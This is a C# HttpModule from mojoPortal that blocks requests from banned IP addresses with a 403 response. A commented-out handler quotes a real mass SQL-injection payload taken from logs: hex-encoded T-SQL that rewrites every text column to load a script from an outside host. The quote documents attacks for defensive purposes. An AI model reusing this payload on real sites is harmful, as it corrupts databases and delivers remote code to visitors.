// http://www.aspnetresources.com/blog/fighting_view_state_spam.aspx
// Copyright (c) 2004-2006, Milan Negovan 
// http://www.AspNetResources.com
// All rights reserved.
//
// Redistribution and use in source and binary forms, with or without 
// modification, are permitted provided that the following conditions 
// are met:
//
//    * Redistributions of source code must retain the above copyright 
//      notice, this list of conditions and the following disclaimer.
//      
//    * Redistributions in binary form must reproduce the above copyright 
//      notice, this list of conditions and the following disclaimer in 
//      the documentation and/or other materials provided with the 
//      distribution.
//      
//    * The name of the author may not be used to endorse or promote products
//      derived from this software without specific prior written permission.
//
// THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS 
// "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED 
// TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR 
// PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR 
// CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, 
// EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, 
// PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; 
// OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, 
// WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR 
// OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF 
// ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
// 
// 2007-09-23  added logging with log4net
// 2007-09-24  changed so that banned ips are stored in the db
// instead of text file
// 2008-01-05 added try catch to prevent error before upgrade creates the table
// 2008-08-15 added ViewStateIsHacked funtion and additional true criteria

using System;
using System.Data.Common;
using System.IO;
using System.Web;
using log4net;
using mojoPortal.Business;
using mojoPortal.Business.WebHelpers;
using mojoPortal.Web.Framework;

namespace mojoPortal.Web
{
    /// <summary>
    ///
    /// </summary>
    public class BannedIPBlockingHttpModule : IHttpModule
    {
        private static readonly ILog log = LogManager.GetLogger(typeof(BannedIPBlockingHttpModule));


        public void Init(HttpApplication application)
        {
            application.BeginRequest += new EventHandler(BeginRequest);
            application.EndRequest += new EventHandler(this.EndRequest);
        }

        
        private void BeginRequest(object sender, EventArgs e)
        {
            if (WebConfigSettings.DisableBannedIpBlockingModule) { return; }

            HttpApplication app = ((HttpApplication)sender);

            if (WebUtils.IsRequestForStaticFile(app.Request.Path)) { return; }


            HttpContext context = app.Context;
            string ip = SiteUtils.GetIP4Address();

            try
            {
                if (!IsBanned(ip)) return;

                AbortRequestFromBannedIP(context);
            }
            catch (DbException ex)
            {
                log.Error("handled exception: ", ex);
            }
            catch (InvalidOperationException ex)
            {
                log.Error("handled exception: ", ex);
            }
            catch (Exception ex)
            {
                // hate to trap System.Exception but SqlCeException doe snot inherit from DbException as it should
                if (DatabaseHelper.DBPlatform() != "SqlCe") { throw; }
                log.Error(ex);
            }
        }

       
        //private void Error(object sender, EventArgs e)
        //{
        //    // don't throw an error in our error handler
        //    try
        //    {
        //        HttpApplication app = (HttpApplication)sender;
        //        HttpContext context = app.Context;

        //        Exception rawException = context.Server.GetLastError();
        //        if (rawException != null)
        //        {
        //            if (
        //                (rawException is PathTooLongException)
        //                || ((rawException.InnerException != null) && (rawException.InnerException is PathTooLongException))
        //                )
        //            {
        //                // hacking attempts
        //                /* example seen in logs
        //                 * /download.aspx?skin=printerfriendly;DeCLARE%20@S%20CHAR(4000);SET%20@S=CAST(0x4445434C415245204054207661726368617228323535292C40432076617263686172283430303029204445434C415245205461626C655F437572736F7220435552534F5220464F522073656C65637420612E6E616D652C622E6E616D652066726F6D207379736F626A6563747320612C737973636F6C756D6E73206220776865726520612E69643D622E696420616E6420612E78747970653D27752720616E642028622E78747970653D3939206F7220622E78747970653D3335206F7220622E78747970653D323331206F7220622E78747970653D31363729204F50454E205461626C655F437572736F72204645544348204E4558542046524F4D20205461626C655F437572736F7220494E544F2040542C4043205748494C4528404046455443485F5354415455533D302920424547494E20657865632827757064617465205B272B40542B275D20736574205B272B40432B275D3D5B272B40432B275D2B2727223E3C2F7469746C653E3C736372697074207372633D22687474703A2F2F777777332E3830306D672E636E2F63737273732F772E6A73223E3C2F7363726970743E3C212D2D272720776865726520272B40432B27206E6F74206C696B6520272725223E3C2F7469746C653E3C736372697074207372633D22687474703A2F2F777777332E3830306D672E636E2F63737273732F772E6A73223E3C2F7363726970743E3C212D2D272727294645544348204E4558542046524F4D20205461626C655F437572736F7220494E544F2040542C404320454E4420434C4F5345205461626C655F437572736F72204445414C4C4F43415445205461626C655F437572736F72%20AS%20CHAR(4000));ExEC(@S);
        //                 */
        //                app.Context.Server.ClearError();

        //                /* Blacklist em */
        //                AddIPToBanList(context, "PathTooLongException");
        //                AbortRequestFromBannedIP(context);
        //                return;

        //            }
                    
                   
        //        }


                
        //        //string viewState = context.Request.Form["__VIEWSTATE"];

        //        //if (viewState == null || viewState.Length == 0)
        //        //    return;

        //        //if (ViewStateIsHacked(viewState))
        //        //{
        //        //    app.Context.Server.ClearError();

        //        //    /* Blacklist em */
        //        //    AddIPToBanList(context, "detected viewstate manipulation");
        //        //    AbortRequestFromBannedIP(context);
        //        //}
        //    }
        //    catch (Exception ex)
        //    {
        //        log.Error("handled exception: ", ex);
        //    }
        //}

        //private bool ViewStateIsHacked(string viewState)
        //{
        //    /* There are numerous ways to screw up view state, but it should always be Base64-encoded. 
        //           Spammers try to plug emails into view state in plain text, and we can look for '@' since
        //           it's not allowed in Base64. It's a smoke test, but it should serve its purpose well.
               
        //           We'll try to extract view state from the Form collection and see what we're dealing with.
        //           The exception we receive here is too generic to tell.
        //        */

        //    if (HttpUtility.HtmlDecode(viewState).IndexOf('@') > -1)
        //    {
        //        return true;
        //    }

        //    // I see this all the time in my logs always the browser is Opera
        //    if (viewState == "/wEWBwLs aoIAvub76kOAqDii7cIAoHH I8IAobm wECyqTuxgIChJ/kwgI=")
        //    {
        //        return true;
        //    }

        //    if (viewState == "/wEWBwKo/aC9BgL7m  pDgKg4ou3CAKBx/iPCAKG5vsBAsqk7sYCAoSf5MIC")
        //    {
        //        return true;
        //    }

        //    return false;
        //}

        
        private void EndRequest(object sender, EventArgs e)
        {
            HttpApplication app = (HttpApplication)sender;
            HttpContext context = app.Context;
            HttpResponse response = context.Response;


            if (!context.Items.Contains("BanCurrentRequest"))
                return;

            response.ClearContent();
            response.SuppressContent = true;
            response.StatusCode = 403;
            response.StatusDescription = "Access denied: your IP has been banned due to spamming or hacking attempts.";
        }

        
        //private void AddIPToBanList(HttpContext context, string reason)
        //{
        //    string ip = SiteUtils.GetIP4Address();

        //    if (IsBanned(ip)) return; //already banned

        //    BannedIPAddress ipToBan = new BannedIPAddress();
        //    ipToBan.BannedIP = ip;
        //    ipToBan.BannedUtc = DateTime.UtcNow;
        //    ipToBan.BannedReason = reason;
        //    ipToBan.Save();

        //    String pathToCacheDependencyFile
        //            = HttpContext.Current.Server.MapPath(
        //        "~/Data/bannedipcachedependency.config");
        //    CacheHelper.TouchCacheFile(pathToCacheDependencyFile);

        //    log.Info("BannedIPBlockingHttpModule banned ip address " + ip + " for reason: " + reason);
        //}

        
        private static void AbortRequestFromBannedIP(HttpContext context)
        {
            context.Items["BanCurrentRequest"] = true;
            context.ApplicationInstance.CompleteRequest();
            if (WebConfigSettings.LogBlockedRequests)
            {
                log.Info("BannedIPBlockingHttpModule blocked request from banned ip address " + SiteUtils.GetIP4Address());
            }
        }

        private bool IsBanned(string ip)
        {
            // 2008-08-13 this list got too large over time
            // better to make a small hit to the db on each request than to cache this huge List

            //List<String> bannedIPs = CacheHelper.GetBannedIPList();
            //if(bannedIPs.Contains(ip))return true;
            //return false;

            return BannedIPAddress.IsBanned(ip);

        }

        
        public void Dispose() { }
    }
}